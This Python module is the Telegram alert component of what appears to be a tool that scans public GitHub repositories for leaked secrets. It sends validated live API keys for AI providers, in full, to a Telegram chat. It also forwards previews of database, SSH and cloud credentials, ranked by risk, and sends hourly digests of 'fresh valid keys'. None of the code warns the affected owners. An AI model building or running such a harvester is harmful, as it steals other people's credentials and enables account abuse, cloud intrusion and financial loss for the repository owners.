import json
import httpx
import logging
from datetime import datetime, timezone, timedelta
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

log = logging.getLogger(__name__)

_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

_PROVIDER_EMOJI = {
    "openai":     "🟢",
    "anthropic":  "🟣",
    "google":     "🔵",
    "deepseek":   "🟡",
    "elevenlabs": "🟠",
    "ark":        "🔴",
    "happyhorse": "🐴",
}


async def _send(text: str, parse_mode: str = "HTML"):
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            await c.post(_URL, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text[:4096],  # Telegram message limit
                "parse_mode": parse_mode,
                "disable_web_page_preview": True,
            })
    except Exception as e:
        log.error("telegram send err: %s", e)


async def notify_found(provider: str, key: str, repo: str, file_path: str,
                       file_url: str, stars: int, created_at: str,
                       file_type: str, is_valid: bool):
    status = "✅ VALID LIVE KEY" if is_valid else "⚠️ FOUND (unverified)"
    emoji  = _PROVIDER_EMOJI.get(provider, "🔑")
    age    = created_at[:10] if created_at else "unknown"

    msg = (
        f"{status} {emoji}\n"
        f"<b>Provider:</b> {provider.upper()}\n"
        f"<b>Key:</b> <code>{key}</code>\n"
        f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>\n"
        f"<b>Stars:</b> ⭐ {stars}  |  created {age}\n"
        f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
        f"<b>Type:</b> {file_type}"
    )
    await _send(msg)


async def notify_cycle_done(stats: dict):
    by_prov = stats.get("by_provider", [])
    lines = [
        f"🔄 <b>Scan cycle done</b>",
        f"Repos: {stats['repos_scanned']} | Files: {stats['files_scanned']}",
        f"Keys found: <b>{stats['keys_found']}</b>  Valid: <b style='color:green'>{stats['keys_valid']}</b>",
    ]
    if by_prov:
        lines.append("\n<b>By provider (all-time):</b>")
        for row in by_prov:
            e = _PROVIDER_EMOJI.get(row["provider"], "🔑")
            lines.append(f"{e} {row['provider'].upper()}: {row['total']} found, {row['valid']} valid")
    await _send("\n".join(lines))


async def notify_hourly_digest(by_provider: list[dict], total_new: int,
                               total_valid: int, new_valid_keys: list[dict]):
    """Hourly summary — only sent if at least 1 new key was found."""
    if total_new == 0:
        return

    now_str = datetime.now(timezone.utc).strftime("%H:%M UTC")
    lines = [
        f"🕐 <b>Hourly digest @ {now_str}</b>",
        f"New this hour: <b>{total_new}</b> keys  |  Valid: <b>{total_valid}</b>",
        "",
        "<b>Breakdown by provider:</b>",
    ]

    for row in by_provider:
        e    = _PROVIDER_EMOJI.get(row["provider"], "🔑")
        prov = row["provider"].upper()
        cnt  = row["cnt"]
        v    = row["valid_cnt"]
        badge = " ✅" if v > 0 else ""
        lines.append(f"{e} {prov}: {cnt} new, {v} valid{badge}")

    if new_valid_keys:
        lines.append("")
        lines.append("<b>Fresh valid keys:</b>")
        for k in new_valid_keys[:5]:
            e = _PROVIDER_EMOJI.get(k["provider"], "🔑")
            lines.append(
                f"{e} {k['provider'].upper()} — <code>{k['key_preview']}</code>\n"
                f"    <a href='https://github.com/{k['repo']}'>{k['repo']}</a>"
            )

    await _send("\n".join(lines))


# ── Infrastructure credential alerts ───────────────────────────────────────

_RISK_EMOJI = {"high": "🔴", "medium": "🟡", "low": "⚪"}
_CRED_EMOJI = {
    "database": "🗄️",
    "ssh":      "🔐",
    "aws":      "☁️",
    "alibaba":  "🔶",
    "azure":    "🔷",
    "infra":    "🚀",
}


async def notify_infra_found(cred_type: str, cred: str, repo: str,
                              file_path: str, file_url: str,
                              stars: int, created_at: str, file_type: str,
                              destination: str, risk_level: str,
                              risk_reasons: list[str]):
    if risk_level == "low":
        return  # low-risk: stored in DB, не шумим в Telegram

    risk_e = _RISK_EMOJI.get(risk_level, "⚪")
    cred_e = _CRED_EMOJI.get(cred_type, "🔑")
    age    = created_at[:10] if created_at else "unknown"

    preview = cred[:25] + "..." + cred[-10:] if len(cred) > 35 else cred[:20] + "..."
    dest_line    = f"\n<b>Destination:</b> <code>{destination}</code>" if destination else ""
    reasons_txt  = "\n".join(f"  • {r}" for r in risk_reasons[:5]) or "—"

    msg = (
        f"{risk_e} <b>INFRA CRED — {risk_level.upper()} RISK</b> {cred_e}\n"
        f"<b>Type:</b> {cred_type.upper()}  |  <b>File:</b> {file_type}\n"
        f"<b>Preview:</b> <code>{preview}</code>"
        f"{dest_line}\n"
        f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>  ⭐{stars}  ({age})\n"
        f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
        f"<b>Risk factors:</b>\n{reasons_txt}"
    )
    await _send(msg)


async def notify_infra_hourly(by_type: list[dict], total: int, high: int):
    if total == 0:
        return
    lines = [f"\n🏗️ <b>Infra credentials this hour: {total}</b> ({high} high-risk)"]
    for row in by_type:
        e     = _CRED_EMOJI.get(row["cred_type"], "🔑")
        hc    = row.get("high_cnt", 0)
        badge = " 🔴" if hc > 0 else ""
        lines.append(f"{e} {row['cred_type'].upper()}: {row['cnt']}{badge}")
    await _send("\n".join(lines))
